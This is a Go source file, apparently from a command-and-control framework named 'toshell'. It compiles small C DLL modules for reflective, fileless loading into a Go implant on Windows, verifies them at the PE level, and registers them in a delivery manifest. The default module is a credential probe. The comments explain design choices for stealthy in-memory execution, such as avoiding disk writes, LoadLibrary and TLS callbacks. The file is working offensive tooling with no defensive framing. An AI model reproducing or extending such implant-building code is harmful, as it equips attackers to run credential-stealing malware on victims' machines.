package builder

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io/fs"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	"toshell/internal/common/moduleabi"
	"toshell/internal/server/logging"
	"toshell/internal/server/modules"
)

// ─── 内存模块构建器（v1.4.0 S4）──────────────────────────────────────────────
//
// 为什么模块要由**服务端**构建、并落进 data/modules + manifest：
//   - 模块的价值之一是"服务端更新模块而不用重编载荷"。要做到这点，服务端必须持有一份
//     **被登记过**（sha256/size/abi/arch 都写进清单）的模块产物；否则"下发哪个字节"
//     就只能靠操作员手工保证，校验链的第一步就塌了。
//   - 清单是下发链的信任锚：接口只认清单里登记过的 id，字节必须与清单哈希一致（硬拦）。
//
// 为什么模块是 **C**（-nostdlib）而不是 Go：
//   - 宿主是反射式映射（不落盘、不走 LoadLibrary、不注册 TLS）。Go 编译的 PE 进
//     Go 宿主会在同一进程里出现两个 Go runtime（调度器/mspan/信号栈互相踩踏），
//     builder.CheckMemoryExec 早就把它列为**硬边界**（实测崩宿主）。
//   - cgo/-buildmode=c-shared 也不行：那种 DLL 依赖 PE 加载器初始化 `_tls_index`
//     与 CRT/DllMain 序列，手工映射下拿不到，属于"有时能跑"的碰运气路径。
//   - -nostdlib 的 C 模块没有 CRT、没有 TLS 目录、没有初始化顺序要求，映射完即可调用；
//     体积也只有几 KB（示例 cred_probe 实测 7.5 KB）。
//
// 产物与清单的关系：本函数是 list 的**唯一写入方**（同 id 覆盖，其它条目保留），
// 写入前对产物做 PE 级自检（架构/无 TLS/非 Go/ABI 导出齐全），避免把不合规的东西
// 登记进清单 —— 登记了却过不了校验链，只会让操作员困惑。

// ModuleBuildOptions 模块构建入参。
type ModuleBuildOptions struct {
	// ID 模块 id（清单主键，也是产物文件名 <id>.dll）。为空时取源文件名。
	ID string
	// Name/Description 展示用。
	Name        string
	Description string
	// SourcePath 模块 C 源文件；为空 = 用内置示例模块 implant_c/module/cred_probe.c。
	SourcePath string
	// Arch 目标架构（386 / amd64），默认 386（与默认载荷档一致）。
	Arch string
	// OutDir 模块目录，默认 modules.DefaultDir。
	OutDir string
	// ArgsSchema 参数说明（展示用，服务端不校验）。
	ArgsSchema string
	// ExtraCFlags 追加的编译参数（高级用法；默认已含 -O2 -s -nostdlib）。
	ExtraCFlags []string
}

// ModuleBuildResult 构建结果（含登记后的清单条目与校验所需的事实）。
type ModuleBuildResult struct {
	Entry    modules.Entry
	Path     string
	Size     int64
	SHA256   string
	Exports  []string
	GCC      string
	Command  string
	Warnings []string
}

// moduleIDRe 模块 id 的字符集约束：id 会变成**文件名**与清单主键，必须保守
// （不允许路径分隔符/点号/空格），否则一个拼错的 id 就能变成"写到模块目录之外"。
var moduleIDRe = regexp.MustCompile(`^[A-Za-z0-9_-]{1,64}$`)

// moduleSourceDir 解析模块源码目录（与 C 植入端同一套"模板目录可能只配了 Go 模板"的兜底）。
func (b *Builder) moduleSourceDir() (string, error) {
	candidates := []string{filepath.Join(b.implantDir, "..", "implant_c", "module")}
	if exePath, err := os.Executable(); err == nil {
		candidates = append(candidates, filepath.Join(filepath.Dir(exePath), "implant_c", "module"))
	}
	for _, dir := range candidates {
		if info, err := os.Stat(filepath.Join(dir, "tsh_module.h")); err == nil && !info.IsDir() {
			return dir, nil
		}
	}
	return "", fmt.Errorf("模块源码目录未找到（期望 implant_c/module/tsh_module.h 与示例模块源码；"+
		"已尝试：%s）", strings.Join(candidates, "、"))
}

// BuildModule 编译一个内存模块、做 PE 级自检、写进模块目录并登记到 manifest.json。
func (b *Builder) BuildModule(opts ModuleBuildOptions) (*ModuleBuildResult, error) {
	srcDir, err := b.moduleSourceDir()
	if err != nil {
		return nil, err
	}

	srcName := filepath.Base(strings.TrimSpace(opts.SourcePath))
	if srcName == "" || srcName == "." || srcName == string(filepath.Separator) {
		srcName = "cred_probe.c"
	}
	if filepath.Ext(srcName) != ".c" {
		return nil, fmt.Errorf("模块源码必须是 .c 文件（当前 %q）：内存模块用 C + -nostdlib 构建，见 builder/module.go 顶部说明", srcName)
	}
	srcFile := filepath.Join(srcDir, srcName)
	if _, err := os.Stat(srcFile); err != nil {
		return nil, fmt.Errorf("模块源码不存在：%s", srcFile)
	}

	id := strings.TrimSpace(opts.ID)
	if id == "" {
		id = strings.TrimSuffix(srcName, ".c")
	}
	// id 会变成文件名与清单主键：只允许保守字符集，禁止路径分隔符/相对路径。
	if !moduleIDRe.MatchString(id) {
		return nil, fmt.Errorf("模块 id %q 不合法：只允许字母/数字/下划线/短横线（1-64 字符）", id)
	}

	arch := strings.TrimSpace(opts.Arch)
	if arch == "" {
		// 默认 386：与默认载荷档（windows/386 light）一致；模块必须与宿主同架构，
		// 让"不填就跟着默认档走"成为最不容易出错的选择。
		arch = "386"
	}
	arch = normalizeArch(arch)
	outDir := opts.OutDir
	if outDir == "" {
		outDir = modules.DefaultDir
	}

	gcc, gccWarning, err := resolveGCC(arch)
	if err != nil {
		return nil, fmt.Errorf("构建内存模块需要 mingw gcc：%w", err)
	}
	var warnings []string
	if gccWarning != "" {
		warnings = append(warnings, gccWarning)
	}

	tmpDir, err := os.MkdirTemp("", "toshell-module-*")
	if err != nil {
		return nil, err
	}
	defer os.RemoveAll(tmpDir)

	// 把整个 module 目录复制进临时目录：保证 include "tsh_module.h" 能解析，
	// 且构建过程不改动仓库里的源码。
	if err := copyTree(srcDir, tmpDir); err != nil {
		return nil, err
	}

	outName := id + ".dll"
	outPath := filepath.Join(tmpDir, outName)

	args := []string{
		"-shared", "-O2", "-s",
		// -nostdlib：不带 CRT（见文件头说明）。这是本模块能可靠反射加载的关键。
		"-nostdlib",
		// 入口点显式指定为模块自己的空 DllMain 等价物：-nostdlib 下没有默认入口，
		// 不指定会让 PE 的 AddressOfEntryPoint 指向 0，宿主会按"无入口"处理。
		"-Wl,--entry=tsh_module_entry",
	}
	if arch == "386" {
		// 386 上 __stdcall 会把导出名修饰成 tsh_module_main@4；宿主按字面名查导出，
		// 必须剥掉 @N（与 dll.go 的 c-shared 处理同一原因）。
		args = append(args, "-Wl,--kill-at")
	}
	args = append(args, opts.ExtraCFlags...)
	args = append(args,
		"-o", outPath, filepath.Join(tmpDir, srcName),
		// 只链 Win32 导入库：模块自己声明用到的 API，不需要 CRT。
		"-lkernel32", "-ladvapi32")

	cmd := exec.Command(gcc.Path, args...)
	cmd.Dir = tmpDir
	out, err := cmd.CombinedOutput()
	cmdLine := gcc.Path + " " + strings.Join(args, " ")
	if err != nil {
		return nil, fmt.Errorf("模块编译失败（%s）：%v\n输出：%s", gcc.Path, err, strings.TrimSpace(string(out)))
	}

	raw, err := os.ReadFile(outPath)
	if err != nil {
		return nil, fmt.Errorf("读取模块产物失败：%w", err)
	}

	// ── PE 级自检（构建期就把不合规的产物拦下，而不是等下发时才发现）──
	info, err := InspectPE(raw)
	if err != nil {
		return nil, fmt.Errorf("模块产物不是合法 PE：%w", err)
	}
	actualArch := info.Machine
	if actualArch != arch {
		warnings = append(warnings, fmt.Sprintf("请求架构 %s，但产物实际是 %s（本机 gcc 架构不匹配）；"+
			"清单将按**实际**架构登记，下发时会按真实架构做匹配", arch, actualArch))
	}
	if !info.IsDLL {
		return nil, fmt.Errorf("模块产物没有 IMAGE_FILE_DLL 标志：它会被当成 EXE，反射加载找不到导出函数（构建参数可能被 ExtraCFlags 破坏）")
	}
	if info.HasTLSDir {
		return nil, fmt.Errorf("模块产物带 TLS 目录：反射映射不会执行 TLS 回调，模块可能读到未初始化状态；" +
			"请确认没有用 __declspec(thread)/带 CRT 的构建参数")
	}
	if info.HasCLRDir {
		return nil, fmt.Errorf("模块产物带 CLR 目录（.NET）：进程内没有 CLR 宿主，反射加载必然失败")
	}
	if isGo, evidence := DetectGoBinary(raw); isGo {
		return nil, fmt.Errorf("模块产物是 Go 编译的（%s）：宿主植入端也是 Go，进程内会出现两个 Go runtime 并崩宿主；"+
			"内存模块必须用 C + -nostdlib 构建", evidence)
	}

	exports, err := ExportedNames(raw)
	if err != nil {
		return nil, fmt.Errorf("解析模块导出表失败：%w", err)
	}
	if ok, missing := HasExports(exports, moduleabi.ExportABI, moduleabi.ExportMain); !ok {
		return nil, fmt.Errorf("模块缺少必需导出 %v（当前导出：%v）：ABI 约定见 implant_c/module/tsh_module.h",
			missing, exports)
	}

	// ── 落盘 + 登记清单 ──
	if err := os.MkdirAll(outDir, 0o755); err != nil {
		return nil, fmt.Errorf("创建模块目录 %s 失败：%w", outDir, err)
	}
	sum := sha256.Sum256(raw)
	shaHex := hex.EncodeToString(sum[:])
	finalPath := filepath.Join(outDir, outName)
	if err := os.WriteFile(finalPath, raw, 0o644); err != nil {
		return nil, fmt.Errorf("写入模块文件 %s 失败：%w", finalPath, err)
	}

	entry := modules.Entry{
		ID:          id,
		Name:        firstNonEmpty(opts.Name, id),
		Description: opts.Description,
		File:        outName,
		SHA256:      shaHex,
		Size:        int64(len(raw)),
		ABI:         moduleabi.Version,
		OS:          "windows",
		Arch:        actualArch,
		Entry:       moduleabi.ExportMain,
		ArgsSchema:  opts.ArgsSchema,
		Source:      filepath.ToSlash(filepath.Join("internal/server/builder/implant_c/module", srcName)),
		BuiltAt:     time.Now().Format(time.RFC3339),
		BuildCmd:    cmdLine,
	}
	if err := registerModuleEntry(outDir, entry); err != nil {
		return nil, err
	}

	logging.Info("builder", "module built: id=%s file=%s size=%d sha256=%s arch=%s abi=%d exports=%v",
		entry.ID, finalPath, entry.Size, shaHex[:12], entry.Arch, entry.ABI, exports)

	return &ModuleBuildResult{
		Entry:    entry,
		Path:     finalPath,
		Size:     entry.Size,
		SHA256:   shaHex,
		Exports:  exports,
		GCC:      gcc.Path,
		Command:  cmdLine,
		Warnings: warnings,
	}, nil
}

// registerModuleEntry 把（或替换）一条清单条目写回 manifest.json（同 id 覆盖）。
func registerModuleEntry(dir string, entry modules.Entry) error {
	m, err := modules.LoadManifestFile(dir)
	if err != nil {
		return err
	}
	replaced := false
	for i := range m.Modules {
		if m.Modules[i].ID == entry.ID {
			m.Modules[i] = entry
			replaced = true
			break
		}
	}
	if !replaced {
		m.Modules = append(m.Modules, entry)
	}
	m.GeneratedAt = time.Now().Format(time.RFC3339)
	return modules.WriteManifestFile(dir, m)
}

// copyTree 递归复制目录（模块源码目录很小：头文件 + 示例 .c）。
func copyTree(src, dst string) error {
	return filepath.WalkDir(src, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		rel, err := filepath.Rel(src, path)
		if err != nil {
			return err
		}
		target := filepath.Join(dst, rel)
		if d.IsDir() {
			return os.MkdirAll(target, 0o755)
		}
		data, err := os.ReadFile(path)
		if err != nil {
			return err
		}
		return os.WriteFile(target, data, 0o644)
	})
}

func firstNonEmpty(a, b string) string {
	if strings.TrimSpace(a) != "" {
		return a
	}
	return b
}
